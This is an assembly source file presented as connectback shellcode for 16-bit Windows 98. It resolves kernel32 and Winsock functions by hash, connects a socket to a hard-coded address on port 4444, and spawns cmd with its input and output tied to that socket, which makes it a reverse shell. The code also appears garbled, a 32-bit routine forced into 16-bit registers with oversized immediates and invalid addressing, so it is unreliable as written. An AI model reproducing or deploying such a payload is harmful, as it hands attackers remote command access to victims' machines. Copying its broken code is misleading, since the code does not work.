; Connectback shellcode for Windows 98 (16-bit)
section .text
global _start

_start:
    ; Jump to the startup bounce point
    jmp startup_bnc

find_kernel32:
    ; Preserve registers
    push si
    xor ax, ax
    mov ax, fs:[ax + 0x30]
    test ax, ax
    js find_kernel32_9x
find_kernel32_nt:
    mov ax, [ax + 0x0c]
    mov si, [ax + 0x1c]
    lodsw
    mov ax, [ax + 0x8]
    jmp find_kernel32_finished
find_kernel32_9x:
    mov ax, [ax + 0x34]
    lea ax, [ax + 0x7c]
    mov ax, [ax + 0x3c]
find_kernel32_finished:
    pop si
    ret

find_function:
    ; Preserve all registers
    pushad
    mov bp, [sp + 0x24]
    mov ax, [bp + 0x3c]
    mov dx, [bp + ax + 0x78]
    add dx, bp
    mov cx, [dx + 0x18]
    mov bx, [dx + 0x20]
    add bx, bp
find_function_loop:
    jcxz find_function_finished
    dec cx
    mov si, [bx + cx * 4]
    add si, bp
    xor di, di
    xor ax, ax
    cld
compute_hash:
    lodsb
    test al, al
    jz compute_hash_finished
    ror di, 0xd
    add di, ax
    jmp compute_hash
compute_hash_finished:
    cmp di, [sp + 0x28]
    jnz find_function_loop
    mov bx, [dx + 0x24]
    add bx, bp
    mov cx, [bx + 2 * cx]
    mov bx, [dx + 0x1c]
    add bx, bp
    mov ax, [bx + 4 * cx]
    add ax, bp
    mov [sp + 0x1c], ax
find_function_finished:
    popad
    ret

startup_bnc:
    jmp startup

resolve_symbols_for_dll:
    lodsw
    push ax
    push dx
    call find_function
    mov [di], ax
    add sp, 0x08
    add di, 0x04
    cmp si, cx
    jne resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
    ret

kernel32_symbol_hashes:
    dw 0xec0e4e8e
    dw 0x16b3fe72
    dw 0x73e2d87e

ws2_32_symbol_hashes:
    dw 0xadf509d9
    dw 0x60aaf9ec

startup:
    sub sp, 0x60
    mov bp, sp
    jmp get_absolute_address_forward
get_absolute_address_middle:
    jmp get_absolute_address_end
get_absolute_address_forward:
    call get_absolute_address_middle
get_absolute_address_end:
    pop si
    call find_kernel32
    mov dx, ax
resolve_kernel32_symbols:
    sub si, 0x22
    lea di, [bp + 0x04]
    mov cx, si
    add cx, 0x0c
    call resolve_symbols_for_dll
resolve_winsock_symbols:
    add cx, 0x08
    xor ax, ax
    mov ax, 0x3233
    push ax
    push 0x5f327377
    mov bx, sp
    push cx
    push dx
    push bx
    call [bp + 0x04]
    pop dx
    pop cx
    mov dx, ax
    call resolve_symbols_for_dll
initialize_cmd:
    mov ax, 0x646d6301
    sar ax, 0x08
    push ax
    mov [bp + 0x30], sp
create_socket:
    xor ax, ax
    push ax
    push ax
    push ax
    push ax
    inc ax
    push ax
    inc ax
    push ax
    call [bp + 0x10]
    mov si, ax
do_connect:
    push 0x0101017f
    mov ax, 0x5c110102
    dec ah
    push ax
    mov bx, sp
    xor ax, ax
    mov al, 0x10
    push ax
    push bx
    push si
    call [bp + 0x14]
initialize_process:
    xor cx, cx
    mov cl, 0x54
    sub sp, cx
    mov di, sp
    push di
zero_structs:
    xor ax, ax
    rep stosb
    pop di
initialize_structs:
    mov byte ptr [di], 0x44
    inc byte ptr [di + 0x2d]
    push di
    mov ax, si
    lea di, [di + 0x38]
    stosw
    stosw
    stosw
    pop di
execute_process:
    xor ax, ax
    lea si, [di + 0x44]
    push si
    push di
    push ax
    push ax
    push ax
    inc ax
    push ax
    dec ax
    push ax
    push ax
    push [bp + 0x30]
    push ax
    call [bp + 0x08]
exit_process:
    call [bp + 0x0c]